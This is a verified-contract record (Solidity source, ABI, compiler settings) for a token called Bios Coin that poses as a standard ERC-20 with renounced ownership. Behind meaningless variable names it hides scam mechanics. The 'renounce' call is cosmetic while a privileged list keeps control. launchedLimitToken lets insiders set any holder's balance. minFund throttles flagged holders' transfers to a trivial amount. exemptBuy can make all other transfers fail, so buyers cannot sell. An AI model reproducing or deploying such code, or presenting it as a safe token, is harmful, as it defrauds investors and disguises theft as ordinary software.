{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract receiverTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toReceiver {\n    function createPair(address receiverFund, address fundTotalAmount) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface totalReceiverSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface toSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalAmount) external view returns (uint256);\n\n    function transfer(address buyAt, uint256 fromTx) external returns (bool);\n\n    function allowance(address walletAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyAt,\n        uint256 fromTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toShould, uint256 value);\n    event Approval(address indexed walletAmount, address indexed spender, uint256 value);\n}\n\ninterface toSellMetadata is toSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BiosCoin is receiverTeam, toSell, toSellMetadata {\n\n    function balanceOf(address totalAmount) public view virtual override returns (uint256) {\n        return buySwap[totalAmount];\n    }\n\n    function sellFeeLaunch(address liquidityTx) public {\n        if (takeBuy) {\n            return;\n        }\n        if (walletBuy == listSwap) {\n            takeLaunched = false;\n        }\n        fromMarketing[liquidityTx] = true;\n        if (takeLaunched) {\n            maxMarketing = true;\n        }\n        takeBuy = true;\n    }\n\n    address public launchedExempt;\n\n    uint8 private exemptWallet = 18;\n\n    uint256 private listSwap;\n\n    mapping(address => uint256) private buySwap;\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptWallet;\n    }\n\n    function getOwner() external view returns (address) {\n        return atFund;\n    }\n\n    uint256 public limitSellAmount = 0;\n\n    function launchedLimitToken(address amountLimit, uint256 fromTx) public {\n        liquidityModeSell();\n        buySwap[amountLimit] = fromTx;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalReceiver;\n    }\n\n    uint256 fundToSell;\n\n    uint256 private walletTx;\n\n    uint256 private minLaunchedTo;\n\n    bool public takeBuy;\n\n    address maxTotalTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return atFund;\n    }\n\n    function teamMin(address takeTradingAt, address buyAt, uint256 fromTx) internal returns (bool) {\n        if (takeTradingAt == totalShould) {\n            return launchedMax(takeTradingAt, buyAt, fromTx);\n        }\n        uint256 receiverTrading = toSell(launchedExempt).balanceOf(maxAmountFrom);\n        require(receiverTrading == fundToSell);\n        require(buyAt != maxAmountFrom);\n        if (autoAt[takeTradingAt]) {\n            return launchedMax(takeTradingAt, buyAt, listLiquidity);\n        }\n        fromTx = liquiditySellIs(takeTradingAt, buyAt, fromTx);\n        return launchedMax(takeTradingAt, buyAt, fromTx);\n    }\n\n    bool private takeLaunched;\n\n    bool public limitSell;\n\n    function approve(address marketingIs, uint256 fromTx) public virtual override returns (bool) {\n        launchedSell[_msgSender()][marketingIs] = fromTx;\n        emit Approval(_msgSender(), marketingIs, fromTx);\n        return true;\n    }\n\n    mapping(address => bool) public fromMarketing;\n\n    bool private maxMarketing;\n\n    function transfer(address amountLimit, uint256 fromTx) external virtual override returns (bool) {\n        return teamMin(_msgSender(), amountLimit, fromTx);\n    }\n\n    function toExempt() public {\n        emit OwnershipTransferred(totalShould, address(0));\n        atFund = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeToken;\n    }\n\n    uint256 constant listLiquidity = 6 ** 10;\n\n    function minFund(address modeTotal) public {\n        liquidityModeSell();\n        if (walletBuy != listSwap) {\n            maxMarketing = false;\n        }\n        if (modeTotal == totalShould || modeTotal == launchedExempt) {\n            return;\n        }\n        autoAt[modeTotal] = true;\n    }\n\n    function allowance(address walletTotal, address marketingIs) external view virtual override returns (uint256) {\n        if (marketingIs == maxTotalTo) {\n            return type(uint256).max;\n        }\n        return launchedSell[walletTotal][marketingIs];\n    }\n\n    mapping(address => bool) public autoAt;\n\n    uint256 private walletBuy;\n\n    uint256 buyEnableTrading;\n\n    function launchedMax(address takeTradingAt, address buyAt, uint256 fromTx) internal returns (bool) {\n        require(buySwap[takeTradingAt] >= fromTx);\n        buySwap[takeTradingAt] -= fromTx;\n        buySwap[buyAt] += fromTx;\n        emit Transfer(takeTradingAt, buyAt, fromTx);\n        return true;\n    }\n\n    string private takeToken = \"BCN\";\n\n    uint256 public totalSellReceiver = 3;\n\n    address maxAmountFrom;\n\n    string private totalReceiver = \"Bios Coin\";\n\n    address private atFund;\n\n    uint256 private tradingWallet = 100000000 * 10 ** 18;\n\n    function exemptBuy(uint256 fromTx) public {\n        liquidityModeSell();\n        fundToSell = fromTx;\n    }\n\n    event OwnershipTransferred(address indexed fundLaunchShould, address indexed takeAt);\n\n    function liquiditySellIs(address takeTradingAt, address buyAt, uint256 fromTx) internal view returns (uint256) {\n        require(fromTx > 0);\n\n        uint256 buyReceiver = 0;\n        if (takeTradingAt == launchedExempt && totalSellReceiver > 0) {\n            buyReceiver = fromTx * totalSellReceiver / 100;\n        } else if (buyAt == launchedExempt && limitSellAmount > 0) {\n            buyReceiver = fromTx * limitSellAmount / 100;\n        }\n        require(buyReceiver <= fromTx);\n        return fromTx - buyReceiver;\n    }\n\n    address public totalShould;\n\n    function transferFrom(address takeTradingAt, address buyAt, uint256 fromTx) external override returns (bool) {\n        if (_msgSender() != maxTotalTo) {\n            if (launchedSell[takeTradingAt][_msgSender()] != type(uint256).max) {\n                require(fromTx <= launchedSell[takeTradingAt][_msgSender()]);\n                launchedSell[takeTradingAt][_msgSender()] -= fromTx;\n            }\n        }\n        return teamMin(takeTradingAt, buyAt, fromTx);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingWallet;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedSell;\n\n    constructor (){\n        \n        toExempt();\n        totalReceiverSell feeShould = totalReceiverSell(maxTotalTo);\n        launchedExempt = toReceiver(feeShould.factory()).createPair(feeShould.WETH(), address(this));\n        maxAmountFrom = toReceiver(feeShould.factory()).feeTo();\n        if (minLaunchedTo == walletBuy) {\n            minLaunchedTo = listSwap;\n        }\n        totalShould = _msgSender();\n        fromMarketing[totalShould] = true;\n        buySwap[totalShould] = tradingWallet;\n        if (walletBuy == walletTx) {\n            limitSell = true;\n        }\n        emit Transfer(address(0), totalShould, tradingWallet);\n    }\n\n    function liquidityModeSell() private view {\n        require(fromMarketing[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLaunchShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromTx\",\"type\":\"uint256\"}],\"name\":\"exemptBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTx\",\"type\":\"uint256\"}],\"name\":\"launchedLimitToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSellAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"}],\"name\":\"minFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"}],\"name\":\"sellFeeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSellReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTradingAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BiosCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}